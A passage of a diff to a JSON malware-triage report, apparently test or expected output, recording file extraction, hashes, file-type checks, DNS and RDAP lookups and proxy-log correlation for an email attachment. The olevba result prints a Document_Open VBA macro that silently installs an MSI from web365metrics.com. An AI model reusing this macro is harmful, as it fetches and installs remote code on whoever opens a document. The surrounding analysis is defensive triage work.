+        "extracted_from file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": true
+      },
+      "results": {
+        "extracted_ole_analyzer": {
+          "details": {
+            "suspect_files": []
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/octet-stream",
+            "type": "data"
+          },
+          "summary": "File Type Analysis: data (application/octet-stream)",
           "tags": {}
         },
         "url_extraction": {
@@ -139,9 +1054,288 @@
           "tags": {}
         }
       },
+      "tags": {}
+    },
+    "file:ce801838416da318a8a2f1e16d2314414427862bcfb473afda44f0217ec7fa2f": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-0": {
+          "type=document.html": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_hash_analyzer": {
+          "details": {
+            "md5": "0e0c77399b58d550d8287f669a668fea",
+            "sha1": "43760f420e9fe642efe74df4b20a123167b26974",
+            "sha256": "ce801838416da318a8a2f1e16d2314414427862bcfb473afda44f0217ec7fa2f"
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/html",
+            "type": "HTML document, ASCII text, with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: HTML document, ASCII text, with CRLF line terminators (text/html)",
+          "tags": {}
+        },
+        "html_js_extraction": {
+          "details": {
+            "dom_snapshot_files": [],
+            "duplicate_count": 0,
+            "extracted_files": [],
+            "extracted_uri_paths": [],
+            "extracted_urls": [],
+            "inline_handlers": [],
+            "script_count": 0
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:d2d8276ca63e307268dbf1bef2fbf45ba4c65c27494555a7742761c22984f1af": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-1.extracted/_rels/.rels": {}
+      },
+      "redirection": "file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d",
+      "relationships": {
+        "extracted_from file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text, with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text, with CRLF line terminators (text/xml)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [],
+            "urls_grouped_by_domain": {}
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "xml_plain_text_analyzer": {
+          "details": {
+            "xml_plain_text": null
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:d2e401681d96e46cac1c027ce0a02eb6b4b91096c014c3bc170d2025707b63d5": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-9": {
+          "type=image": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "image/png",
+            "type": "PNG image data, 786 x 134, 8-bit/color RGBA, non-interlaced"
+          },
+          "summary": "File Type Analysis: PNG image data, 786 x 134, 8-bit/color RGBA, non-interlaced (image/png)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime": {
+          "type=document.activemime": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:f350d2f7839fe85fb477a02dab68d545a50772314e61113052f082685106f0a2": true
+      },
+      "results": {
+        "file_hash_analyzer": {
+          "details": {
+            "md5": "b7058bb238c86174be5f0b43b382d7a0",
+            "sha1": "e7e757069cf8db19851dd5e51fd088745557ad43",
+            "sha256": "d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06"
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": false,
+            "is_ole_file": true,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/x-ole-storage",
+            "type": "Composite Document File V2 Document, Cannot read section info"
+          },
+          "summary": "File Type Analysis: Composite Document File V2 Document, Cannot read section info (application/x-ole-storage) (ms office document) (ole compound file)",
+          "tags": {}
+        },
+        "officeparser3": {
+          "details": {
+            "extracted_files": [
+              "stream_2_0.dat",
+              "stream_3_0.dat",
+              "stream_4_0.dat",
+              "stream_5_0.dat",
+              "stream_6_0.dat",
+              "ThisDocument.cls"
+            ]
+          },
+          "summary": "OfficeParser3 Analysis: extracted 6 files",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "hex string": 1,
+              "ioc": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime",
+                "local_path": "35009a07fd35e0fa19df9bbdac4649c88a1c8c7090da1fc9e712bb57e15f118d",
+                "stream_path": "VBA/ThisDocument",
+                "vba_code": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPrivate Sub Document_Open()\nOn Error Resume Next\nDim office As Object\nSet office = CreateObject(\"WindowsInstaller.Installer\")\noffice.UILevel = 2\nabc = \"https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi\"\noffice.InstallProduct abc\nEnd Sub\n",
+                "vba_filename": "ThisDocument.cls"
+              }
+            ],
+            "type": "OLE"
+          },
+          "summary": "OLEVBA Analysis: (1 macro files) (OLE) | autoexec=1, suspicious=1, ioc=1, hex string=1",
+          "tags": {}
+        }
+      },
       "tags": {
-        "pdf": true
+        "activemime": true,
+        "microsoft_office": true,
+        "ole": true,
+        "olevba": true
       }
+    },
+    "file:e499895399eac27fac02fb3f05910b7ea986832f73f5169b8c86f201fe44cd27": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime.officeparser/stream_5_0.dat": {}
+      },
+      "redirection": "file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06",
+      "relationships": {
+        "extracted_from file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": true
+      },
+      "results": {
+        "extracted_ole_analyzer": {
+          "details": {
+            "suspect_files": []
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: ASCII text, with CRLF line terminators (text/plain)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [],
+            "urls_grouped_by_domain": {}
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
     },
     "file:edc151959f9b258184960e28a45402d9c6580f5d7ffa475ff17feed9ea79fc0e": {
       "detections": {},
@@ -190,6 +1384,106 @@
             }
           },
           "summary": "URL Extraction Analysis (microsoft.com)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:f350d2f7839fe85fb477a02dab68d545a50772314e61113052f082685106f0a2": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12": {}
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "active_mime": {
+          "details": {
+            "extracted_file": "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime"
+          },
+          "summary": "Active MIME Analysis: extracted <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime",
+          "tags": {}
+        },
+        "file_hash_analyzer": {
+          "details": {
+            "md5": "b863857f6f83ffb5d1b3ca0cbb4c1960",
+            "sha1": "15b6d5b96313f770461560772b27ebc0b839b7af",
+            "sha256": "f350d2f7839fe85fb477a02dab68d545a50772314e61113052f082685106f0a2"
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/octet-stream",
+            "type": "data"
+          },
+          "summary": "File Type Analysis: data (application/octet-stream)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:fce683b665591c9bd05e7252c3b5da8529522eeba040b3f99c95b67cbe7e99eb": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime.officeparser/stream_2_0.dat": {}
+      },
+      "redirection": "file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06",
+      "relationships": {
+        "extracted_from file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": true
+      },
+      "results": {
+        "extracted_ole_analyzer": {
+          "details": {
+            "suspect_files": []
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/octet-stream",
+            "type": "data"
+          },
+          "summary": "File Type Analysis: data (application/octet-stream)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [],
+            "urls_grouped_by_domain": {}
+          },
+          "summary": null,
           "tags": {}
         }
       },
@@ -498,6 +1792,91 @@
         "domain_in_url": true
       }
     },
+    "fqdn:web365metrics.com": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {},
+      "results": {
+        "fqdn_analyzer": {
+          "details": {
+            "aliaslist": [],
+            "all_resolutions": [],
+            "ip_address": null,
+            "mx": null,
+            "resolution_count": null,
+            "status": "nxdomain",
+            "wildcard_dns": null
+          },
+          "summary": "DNS Analysis: does not exist (nxdomain)",
+          "tags": {}
+        },
+        "proxy_domain_splunk": {
+          "details": {
+            "dispatch_state": "DONE",
+            "gui_link": null,
+            "query": "index=proxy hostname=\"web365metrics.com\"",
+            "query_error": null,
+            "query_results": [
+              {
+                "_time": "2026-10-30T14:02:11.000+00:00",
+                "dest_ip": "198.51.100.20",
+                "full_url": "https://www.example.com/login",
+                "src_ip": "192.0.2.10",
+                "src_translated_ip": "198.51.100.7",
+                "user": "alice@example.com"
+              },
+              {
+                "_time": "2026-10-30T14:05:42.000+00:00",
+                "dest_ip": "198.51.100.20",
+                "full_url": "http://www.example.com/",
+                "src_ip": "192.0.2.11",
+                "src_translated_ip": "198.51.100.7",
+                "user": "bob@example.com"
+              },
+              {
+                "_time": "2026-10-30T14:09:03.000+00:00",
+                "dest_ip": "198.51.100.21",
+                "full_url": "https://www.example.com/static/app.js",
+                "src_ip": "192.0.2.12"
+              }
+            ],
+            "query_summary": "Proxy correlation",
+            "question": "Was this domain seen in proxy logs?"
+          },
+          "summary": "Proxy correlation: (3 results)",
+          "tags": {}
+        },
+        "rdap_analyzer": {
+          "details": {
+            "assignment_type": null,
+            "country": null,
+            "datetime_created": null,
+            "datetime_expiration": null,
+            "datetime_of_last_update": null,
+            "domain_name": null,
+            "emails": null,
+            "error": "rdap: Failed to make a GET request to https://rdap.verisign.com/com/v1/domain/web365metrics.com: nothing recorded for GET https://rdap.verisign.com/com/v1/domain/web365metrics.com; whois: no WHOIS in a replay",
+            "ip_version": null,
+            "lookup_protocol": null,
+            "name_servers": null,
+            "network_cidr": null,
+            "network_name": null,
+            "rdap_attempt_error": "Failed to make a GET request to https://rdap.verisign.com/com/v1/domain/web365metrics.com: nothing recorded for GET https://rdap.verisign.com/com/v1/domain/web365metrics.com",
+            "rdap_data": null,
+            "rdap_raw_json": null,
+            "rdap_service_url": null,
+            "registrar": null,
+            "whois_data": null,
+            "whois_raw_text": null
+          },
+          "tags": {}
+        }
+      },
+      "tags": {
+        "domain_in_url": true
+      }
+    },
     "ip:192.0.2.10": {
       "detections": {},
       "directives": {},
@@ -514,6 +1893,26 @@
       },
       "tags": {}
     },
+    "md5:0e0c77399b58d550d8287f669a668fea": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:ce801838416da318a8a2f1e16d2314414427862bcfb473afda44f0217ec7fa2f": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "md5:53c6716ac9eb1dd1bb3309ff2bd91696": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d": true
+      },
+      "results": {},
+      "tags": {}
+    },
     "md5:718148a5712c1fec7b50acc89eee2aa0": {
       "detections": {},
       "directives": {},
@@ -524,12 +1923,62 @@
       "results": {},
       "tags": {}
     },
-    "md5:c8965ce04deeddbf5d2cd8ee4f3e67ef": {
+    "md5:787ce2e28b0066455283cbf27e698bd0": {
       "detections": {},
       "directives": {},
       "excluded_analysis": {},
       "relationships": {
-        "is_hash_of file:9868f7636b573d58d1463542d9e7b63513d898623a32dfc142818bc39c89cce1": true
+        "is_hash_of file:0bea86356ad057bdaa7a53e13e47c264ca5e923fb6f7048e46a7a3860742e64f": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "md5:b7058bb238c86174be5f0b43b382d7a0": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "md5:b863857f6f83ffb5d1b3ca0cbb4c1960": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:f350d2f7839fe85fb477a02dab68d545a50772314e61113052f082685106f0a2": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "md5:f2d5c297d22706dfac670960ff730348": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:5814bcf32598ccca48bbdce433702c6072a353225ed32939d5a52c6eae5838cc": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "sha256:0bea86356ad057bdaa7a53e13e47c264ca5e923fb6f7048e46a7a3860742e64f": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:0bea86356ad057bdaa7a53e13e47c264ca5e923fb6f7048e46a7a3860742e64f": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "sha256:5814bcf32598ccca48bbdce433702c6072a353225ed32939d5a52c6eae5838cc": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:5814bcf32598ccca48bbdce433702c6072a353225ed32939d5a52c6eae5838cc": true
       },
       "results": {},
       "tags": {}
@@ -544,13 +1993,59 @@
       "results": {},
       "tags": {}
     },
-    "sha256:9868f7636b573d58d1463542d9e7b63513d898623a32dfc142818bc39c89cce1": {
+    "sha256:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d": {
       "detections": {},
       "directives": {},
       "excluded_analysis": {},
       "relationships": {
-        "is_hash_of file:9868f7636b573d58d1463542d9e7b63513d898623a32dfc142818bc39c89cce1": true
+        "is_hash_of file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d": true
       },
+      "results": {},
+      "tags": {}
+    },
+    "sha256:ce801838416da318a8a2f1e16d2314414427862bcfb473afda44f0217ec7fa2f": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:ce801838416da318a8a2f1e16d2314414427862bcfb473afda44f0217ec7fa2f": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "sha256:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "sha256:f350d2f7839fe85fb477a02dab68d545a50772314e61113052f082685106f0a2": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:f350d2f7839fe85fb477a02dab68d545a50772314e61113052f082685106f0a2": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "uri_path:/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {},
+      "results": {},
+      "tags": {}
+    },
+    "uri_path:/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi'": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {},
       "results": {},
       "tags": {}
     },
@@ -575,6 +2070,64 @@
         "protected_url_analyzer": {
           "details": {
             "extracted_url": "https://microsoft.com",
+            "protection_type": "unprotected"
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "url:https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {},
+      "results": {
+        "parse_url": {
+          "details": {
+            "fragment": "",
+            "netloc": "web365metrics.com",
+            "params": null,
+            "path": "/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi",
+            "query": "",
+            "scheme": "https"
+          },
+          "summary": "URL Parser: scheme=https, netloc=web365metrics.com, path=/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi",
+          "tags": {}
+        },
+        "protected_url_analyzer": {
+          "details": {
+            "extracted_url": "https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi",
+            "protection_type": "unprotected"
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "url:https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi'": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {},
+      "results": {
+        "parse_url": {
+          "details": {
+            "fragment": "",
+            "netloc": "web365metrics.com",
+            "params": null,
+            "path": "/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi'",
+            "query": "",
+            "scheme": "https"
+          },
+          "summary": "URL Parser: scheme=https, netloc=web365metrics.com, path=/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi'",
+          "tags": {}
+        },
+        "protected_url_analyzer": {
+          "details": {
+            "extracted_url": "https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi'",
             "protection_type": "unprotected"
           },
           "summary": null,
